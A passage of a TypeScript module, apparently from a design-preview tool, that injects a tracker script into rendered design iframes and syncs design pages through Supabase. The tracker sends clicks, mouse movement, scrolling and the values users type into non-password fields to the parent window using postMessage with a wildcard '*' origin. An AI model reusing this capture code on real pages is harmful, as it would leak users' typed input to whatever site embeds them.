function boot(){ replaceEmailPlaceholder(); wireContinueButtons(); }
boot();
if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', boot);
function reportViewport(){ try { parent.postMessage({__ux:true, type:'viewport', w:innerWidth, h:innerHeight}, '*'); } catch(e){} }
reportViewport();
window.addEventListener('resize', reportViewport, {passive:true});
window.addEventListener('click', function(e){ try { parent.postMessage({__ux:true, type:'click', x:e.clientX, y:e.clientY, w:innerWidth, h:innerHeight}, '*'); } catch(e){} });
window.addEventListener('mousemove', function(e){ try { parent.postMessage({__ux:true, type:'mouse', x:e.clientX, y:e.clientY, w:innerWidth, h:innerHeight}, '*'); } catch(e){} }, {passive:true});
window.addEventListener('scroll', function(){ try { parent.postMessage({__ux:true, type:'scroll', sx:scrollX, sy:scrollY}, '*'); } catch(e){} }, {passive:true});
document.addEventListener('input', function(e){
  var t = e.target; if (!t || t.type === 'password') return;
  var name = t.name || t.getAttribute('aria-label') || t.id; if (!name) return;
  try { parent.postMessage({__ux:true, type:'input', field:name, value:t.value}, '*'); } catch(e){}
}, true);
window.addEventListener('message', function(ev){
  var d = ev.data; if (!d || d.__mirror !== true) return;
  if (d.type === 'input' && typeof d.field === 'string') {
    var el = document.querySelector('[name="'+d.field+'"], #'+d.field);
    if (el && el.type !== 'password') el.value = d.value == null ? '' : String(d.value);
  }
});
<\/script>`;

function injectTracker(html: string): string {
  if (/<\/body>/i.test(html))
    return html.replace(/<\/body>/i, TRACKER_SCRIPT + "</body>");
  return html + TRACKER_SCRIPT;
}

function wrap(html: string, css: string, js: string): string {
  return `<!doctype html><html><head><meta charset="utf-8" />
<style>${css}</style></head><body>${html}
${TRACKER_SCRIPT}
<script>${js}<\/script>
</body></html>`;
}


// ---- Change subscriptions (in-tab + cross-tab via storage events) ----

// Compat with the previous Supabase-based realtime channel: callers expect
// something with an `unsubscribe()` method.
export type DesignChangeChannel = { unsubscribe: () => Promise<void> | void };

export function subscribeDesignChanges(
  isInterested: (
    design: DesignKey,
    page: PageSlot,
    kind: FileKind,
  ) => boolean,
  onChange: () => void,
): DesignChangeChannel {
  const handler: FileChangeListener = (f) => {
    if (isInterested(f.design, f.page, f.kind)) onChange();
  };
  _fileListeners.add(handler);
  const offReg = subscribeRegistry(onChange);
  return {
    unsubscribe() {
      _fileListeners.delete(handler);
      offReg();
    },
  };
}

// ---- Remote sync (Supabase design_pages) ----

function applyRemoteRow(row: { design: string; page: string; kind: string; content: string }) {
  const f: DesignFile = {
    design: row.design,
    page: row.page,
    kind: row.kind as FileKind,
  };
  const key = overrideKey(f);
  if (_contentOverrides.get(key) === row.content) return;
  _contentOverrides.set(key, row.content);
  lsSet(OVERRIDE_PREFIX + key, row.content);
  notifyFile(f);
}

let _hydrateResolve: (() => void) | null = null;
export const remoteHydrated: Promise<void> = new Promise((res) => {
  _hydrateResolve = res;
});

async function hydrateFromRemote() {
  try {
    const { data, error } = await supabase
      .from("design_pages")
      .select("design,page,kind,content");
    if (!error && data) for (const row of data) applyRemoteRow(row);
  } catch {
    /* ignore */
  } finally {
    _hydrateResolve?.();
    _hydrateResolve = null;
  }
}

if (typeof window !== "undefined") {
  void hydrateFromRemote();
  try {
    supabase
      .channel("design-pages-sync")
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "design_pages" },
        (payload) => {
          const row = (payload.new ?? payload.old) as {
            design?: string;
            page?: string;
            kind?: string;
            content?: string;
          };
          if (!row?.design || !row.page || !row.kind) return;
          if (payload.eventType === "DELETE") {
            const key = `${row.design}:${row.page}:${row.kind}`;
            _contentOverrides.delete(key);
            lsDel(OVERRIDE_PREFIX + key);
            notifyFile({ design: row.design, page: row.page, kind: row.kind as FileKind });
            return;
          }
          if (typeof row.content === "string") {
            applyRemoteRow(row as { design: string; page: string; kind: string; content: string });
          }
        },
      )
      .subscribe();
  } catch {
    /* ignore */
  }
}
